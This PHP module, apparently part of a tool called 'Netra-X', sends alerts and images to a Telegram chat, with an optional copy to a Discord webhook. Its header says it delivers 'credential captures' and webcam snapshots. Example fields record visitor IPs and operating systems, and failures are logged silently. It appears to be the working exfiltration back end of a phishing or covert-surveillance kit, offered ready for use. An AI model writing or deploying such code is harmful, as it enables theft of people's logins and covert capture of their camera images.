<?php
/* ════════════════════════════════════════════════════════════════════
   core/telegram_webhook.php  --  Real-Time Telegram Bot Notifier
   ---------------------------------------------------------------
   A modular, robust notification engine that sends instant alerts,
   telemetry reports, credential captures, and camera images directly
   to your Telegram Chat / Channel.

   Supports:
     - HTML-formatted rich alerts
     - Photo / Webcam Snapshot uploads
     - Automatic .env configuration
     - Silent error logging to data/telegram_errors.log
   ════════════════════════════════════════════════════════════════════ */

/* ── Load Configuration from .env ───────────────────────────────── */
$env_file = dirname(__DIR__) . '/.env';
$tg_bot_token = '';
$tg_chat_id   = '';
$dc_webhook   = '';

if (file_exists($env_file)) {
    $env_content = file_get_contents($env_file);
    
    // Parse TELEGRAM_BOT_TOKEN
    if (preg_match('/^TELEGRAM_BOT_TOKEN=["\']?(.*?)["\']?$/m', $env_content, $m)) {
        $tg_bot_token = trim($m[1]);
    }
    // Parse TELEGRAM_CHAT_ID
    if (preg_match('/^TELEGRAM_CHAT_ID=["\']?(.*?)["\']?$/m', $env_content, $m)) {
        $tg_chat_id = trim($m[1]);
    }
    // Parse DISCORD_WEBHOOK_URL (optional backward compatibility)
    if (preg_match('/^DISCORD_WEBHOOK_URL=["\']?(.*?)["\']?$/m', $env_content, $m)) {
        $dc_webhook = trim($m[1]);
    }
}

if (!defined('TELEGRAM_BOT_TOKEN')) {
    define('TELEGRAM_BOT_TOKEN', $tg_bot_token);
}
if (!defined('TELEGRAM_CHAT_ID')) {
    define('TELEGRAM_CHAT_ID', $tg_chat_id);
}
if (!defined('DISCORD_WEBHOOK_URL')) {
    define('DISCORD_WEBHOOK_URL', $dc_webhook);
}

define('TELEGRAM_LOG_FILE', dirname(__DIR__) . '/data/telegram_errors.log');

/* ════════════════════════════════════════════════════════════════════
   PUBLIC TELEGRAM API
   ════════════════════════════════════════════════════════════════════ */

/**
 * Send a simple text notification to Telegram.
 *
 * @param  string $message  Text to send
 * @return bool             True on success
 */
function sendTelegramNotification(string $message): bool
{
    if (empty(TELEGRAM_BOT_TOKEN) || empty(TELEGRAM_CHAT_ID)) {
        return false;
    }

    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    $params = [
        'chat_id'                  => TELEGRAM_CHAT_ID,
        'text'                     => $message,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true,
    ];

    return _telegramPost($url, $params);
}

/**
 * Send a structured, formatted alert card to Telegram.
 *
 * @param  string $title   Alert header (e.g. "⚡ New Visitor Arrived")
 * @param  array  $fields  Key-value pairs (e.g. ['IP' => '1.2.3.4', 'OS' => 'Windows'])
 * @return bool            True on success
 */
function sendTelegramAlert(string $title, array $fields = []): bool
{
    $has_tg = (!empty(TELEGRAM_BOT_TOKEN) && !empty(TELEGRAM_CHAT_ID));
    $has_dc = (!empty(DISCORD_WEBHOOK_URL));

    $tg_success = false;

    if ($has_tg) {
        $text  = "<b>" . htmlspecialchars($title) . "</b>\n";
        $text .= "━━━━━━━━━━━━━━━━━━━━\n";

        foreach ($fields as $key => $val) {
            $k = htmlspecialchars((string) $key);
            $v = htmlspecialchars((string) $val);
            $text .= "<b>{$k}:</b> <code>{$v}</code>\n";
        }

        $text .= "━━━━━━━━━━━━━━━━━━━━\n";
        $text .= "🕒 <i>" . date('Y-m-d H:i:s T') . "</i>";

        $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
        $params = [
            'chat_id'                  => TELEGRAM_CHAT_ID,
            'text'                     => $text,
            'parse_mode'               => 'HTML',
            'disable_web_page_preview' => true,
        ];

        $tg_success = _telegramPost($url, $params);
    }

    // Dual dispatch to Discord if configured
    if ($has_dc && function_exists('_discordCurlPost')) {
        $embed_fields = [];
        foreach ($fields as $name => $value) {
            $embed_fields[] = [
                'name'   => (string) $name,
                'value'  => '`' . $value . '`',
                'inline' => false,
            ];
        }
        $payload = json_encode([
            'username' => 'Netra-X Bot',
            'embeds'   => [[
                'title'     => $title,
                'color'     => 0x0088CC, // Telegram Blue
                'fields'    => $embed_fields,
                'footer'    => ['text' => 'Netra-X • ' . date('Y-m-d H:i:s T')],
                'timestamp' => date('c'),
            ]],
        ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        _discordCurlPost(DISCORD_WEBHOOK_URL, $payload);
    }

    return $tg_success;
}

/**
 * Send an image / webcam snapshot directly to Telegram as a photo card.
 *
 * @param  string $filepath Absolute path to image file
 * @param  string $caption  Caption text
 * @return bool             True on success
 */
function sendTelegramImage(string $filepath, string $caption = '📸 Webcam snapshot captured.'): bool
{
    $has_tg = (!empty(TELEGRAM_BOT_TOKEN) && !empty(TELEGRAM_CHAT_ID));
    $has_dc = (!empty(DISCORD_WEBHOOK_URL));

    $tg_success = false;

    if ($has_tg && is_file($filepath) && is_readable($filepath)) {
        $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendPhoto';

        if (function_exists('curl_init')) {
            $ch = curl_init();
            $cfile = new CURLFile($filepath, mime_content_type($filepath) ?: 'image/jpeg', basename($filepath));
            $postFields = [
                'chat_id'    => TELEGRAM_CHAT_ID,
                'photo'      => $cfile,
                'caption'    => "<b>" . htmlspecialchars($caption) . "</b>\n🕒 <i>" . date('Y-m-d H:i:s T') . "</i>",
                'parse_mode' => 'HTML',
            ];

            curl_setopt_array($ch, [
                CURLOPT_URL            => $url,
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => $postFields,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 15,
                CURLOPT_SSL_VERIFYPEER => true,
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlErr  = curl_error($ch);
            curl_close($ch);

            if ($httpCode >= 200 && $httpCode < 300) {
                $tg_success = true;
            } else {
                _telegramLogError("sendPhoto failed HTTP {$httpCode}: {$response} | cURL: {$curlErr}");
            }
        }
    }

    // Dual dispatch to Discord if configured
    if ($has_dc && function_exists('sendDiscordImage')) {
        sendDiscordImage($filepath, $caption);
    }

    return $tg_success;
}

/* ════════════════════════════════════════════════════════════════════
   BACKWARD COMPATIBILITY ALIASES
   ════════════════════════════════════════════════════════════════════ */

if (!function_exists('sendDiscordAlert')) {
    function sendDiscordAlert(string $title, array $fields = [], int $color = 0x0088CC): bool
    {
        return sendTelegramAlert($title, $fields);
    }
}

if (!function_exists('sendDiscordImage')) {
    function sendDiscordImage(string $filepath, string $caption = '', string $username = ''): bool
    {
        return sendTelegramImage($filepath, $caption ?: '📸 Image capture received.');
    }
}

if (!function_exists('sendDiscordNotification')) {
    function sendDiscordNotification(string $message = 'Notification received.', string $username = ''): bool
    {
        return sendTelegramNotification($message);
    }
}

/* ════════════════════════════════════════════════════════════════════
   INTERNAL HELPERS
   ════════════════════════════════════════════════════════════════════ */

function _telegramPost(string $url, array $params): bool
{
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($params),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr  = curl_error($ch);
        curl_close($ch);

        if ($httpCode >= 200 && $httpCode < 300) {
            return true;
        }

        _telegramLogError("sendMessage failed HTTP {$httpCode}: {$response} | cURL: {$curlErr}");
        return false;
    }

    // Stream context fallback
    $opts = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($params),
            'timeout' => 10,
        ],
    ];
    $ctx = stream_context_create($opts);
    $res = @file_get_contents($url, false, $ctx);
    if ($res !== false) {
        return true;
    }

    _telegramLogError("Stream context post failed for {$url}");
    return false;
}

function _telegramLogError(string $msg): void
{
    $logDir = dirname(TELEGRAM_LOG_FILE);
    if (!is_dir($logDir)) {
        @mkdir($logDir, 0750, true);
    }
    @file_put_contents(TELEGRAM_LOG_FILE, '[' . date('Y-m-d H:i:s') . '] ' . $msg . "\n", FILE_APPEND);
}
